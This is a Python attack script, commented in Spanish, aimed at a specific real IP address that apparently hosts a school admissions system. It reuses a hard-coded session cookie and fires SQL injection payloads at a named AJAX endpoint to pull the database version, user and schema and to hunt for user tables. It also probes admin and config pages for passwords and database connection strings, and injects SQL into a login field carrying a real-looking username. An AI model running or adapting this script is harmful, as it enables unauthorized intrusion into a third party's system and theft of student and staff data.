# sito_advanced.py
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SITOAdvanced:
    def __init__(self):
        self.base_url = "https://189.254.143.102"
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.set('JSESSIONID', '3B0DDD39CD0068BB30ED28B8C75B2A38')
        
    def exploit_sql_injection_advanced(self):
        """Explotación avanzada de SQL Injection en los endpoints AJAX"""
        print("=== EXPLOTACIÓN SQL AVANZADA ===")
        
        # El endpoint que SÍ funciona según tus resultados
        endpoint = "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"
        
        # Payloads específicos para MySQL basados en el comportamiento observado
        payloads = [
            # Probemos primero responses válidas
            "1",
            "2", 
            "3",
            
            # SQL Injection que mantenga la estructura esperada
            "1 UNION SELECT 'test1','test2','test3'--",
            "1 UNION SELECT database(),user(),version()--",
            
            # Usando comentarios diferentes
            "1' OR '1'='1'-- -",
            "1' OR 1=1-- -",
            
            # Probando con diferentes sintaxis
            "1' UNION SELECT 1,2,3-- -",
            "1' UNION SELECT @@version,@@hostname,database()-- -",
            
            # Extracción de información de schema
            "1' UNION SELECT table_name,column_name,table_schema FROM information_schema.columns WHERE table_schema=database()-- -",
            
            # Buscar tablas de usuarios
            "1' UNION SELECT table_name,'test','test' FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%user%'-- -",
            
            # Si todo falla, probemos respuestas básicas
            "0",
            "-1",
            " ",
            "'"
        ]
        
        for i, payload in enumerate(payloads):
            url = f"{self.base_url}{endpoint}?xCveBachillerato={payload}"
            try:
                response = self.session.get(url, timeout=10)
                print(f"\n[{i+1}] Payload: {payload}")
                print(f"   Status: {response.status_code}, Tamaño: {len(response.text)}")
                
                # Análisis detallado de la respuesta
                self.analyze_ajax_response(response.text, payload)
                
            except Exception as e:
                print(f"   Error: {e}")
    
    def analyze_ajax_response(self, content, payload):
        """Analiza la respuesta AJAX en detalle"""
        content = content.strip()
        
        if not content:
            print("   ❌ Respuesta vacía")
            return
            
        print(f"   Contenido: '{content}'")
        
        # Buscar patrones específicos
        if "¬" in content or "," in content:
            print("   ✅ Formato de datos reconocido")
            
        if "INSTITUTO OCTAVIO PAZ" in content:
            print("   ✅ Respuesta normal del sistema")
            
        # Buscar indicadores de SQL Injection exitosa
        indicators = [
            ("root@", "Usuario MySQL"),
            ("localhost", "Host de BD"),
            ("mysql", "Motor de BD"),
            ("version()", "Versión inyectada"),
            ("database()", "Nombre de BD"),
            ("@", "Usuario con @"),
            ("5.", "Versión MySQL 5.x"),
            ("8.", "Versión MySQL 8.x")
        ]
        
        for indicator, description in indicators:
            if indicator in content:
                print(f"   🎉 {description} DETECTADO!")
                
        # Si la respuesta es diferente a la normal
        normal_responses = ["1¬INSTITUTO OCTAVIO PAZ", "1,INSTITUTO OCTAVIO PAZ"]
        if content not in normal_responses and len(content) > 5:
            print("   ⚠️  Respuesta DIFERENTE detectada!")
            
            # Guardar respuesta interesante
            with open(f"ajax_interesting_{hash(payload)}.txt", "w", encoding="utf-8") as f:
                f.write(f"Payload: {payload}\n")
                f.write(f"Response: {content}\n")
    
    def discover_sito_structure(self):
        """Descubre la estructura de la aplicación SITO"""
        print("\n=== DESCUBRIENDO ESTRUCTURA SITO ===")
        
        # Basado en los formularios que encontraste
        base_paths = [
            "/jsp/",
            "/jsp/escolar/", 
            "/jsp/escolar/proceso_admision/",
            "/jsp/admin/",
            "/jsp/config/",
            "/jsp/reportes/"
        ]
        
        common_files = [
            "index.jsp", "main.jsp", "home.jsp", "login.jsp", "admin.jsp",
            "config.jsp", "database.jsp", "users.jsp", "reportes.jsp",
            "backup.jsp", "export.jsp", "import.jsp"
        ]
        
        for base_path in base_paths:
            for file in common_files:
                url = f"{self.base_url}{base_path}{file}"
                try:
                    response = self.session.get(url, timeout=5)
                    if response.status_code == 200:
                        print(f"✅ Encontrado: {base_path}{file}")
                        
                        # Buscar información sensible
                        if any(keyword in response.text.lower() for keyword in 
                              ['password', 'jdbc', 'mysql', 'usuario', 'contrasena']):
                            print("   🔍 Información sensible detectada!")
                            
                except:
                    pass
    
    def test_parameter_manipulation(self):
        """Prueba manipulación de parámetros en formularios"""
        print("\n=== TESTEO DE PARÁMETROS ===")
        
        # URL del formulario principal
        form_url = f"{self.base_url}/jsp/escolar/proceso_admision/proceso_interesado.jsp"
        
        # Obtener el formulario primero
        response = self.session.get(form_url)
        
        # Parámetros basados en tu análisis
        params = {
            "yAccion": "debug",
            "yInteresado": "1", 
            "yEncuestado": "1",
            "yCveTipoSeguroOtro": "999",
            "yResolucion": "admin",
            "ySexo": "X",
            "yBloqueoG": "false",
            "yMenorEdad": "0",
            "xUsuario": "hnieto' OR '1'='1'-- -"
        }
        
        try:
            response = self.session.post(form_url, data=params)
            print(f"Status: {response.status_code}, Tamaño: {len(response.text)}")
            
            # Buscar mensajes de error o éxito
            if "error" in response.text.lower():
                print("⚠️  Posible error inyectado")
            if "admin" in response.text.lower():
                print("🔍 Referencia a admin encontrada")
                
        except Exception as e:
            print(f"Error: {e}")

# Ejecutar
if __name__ == "__main__":
    sito = SITOAdvanced()
    sito.exploit_sql_injection_advanced()
    sito.discover_sito_structure() 
    sito.test_parameter_manipulation()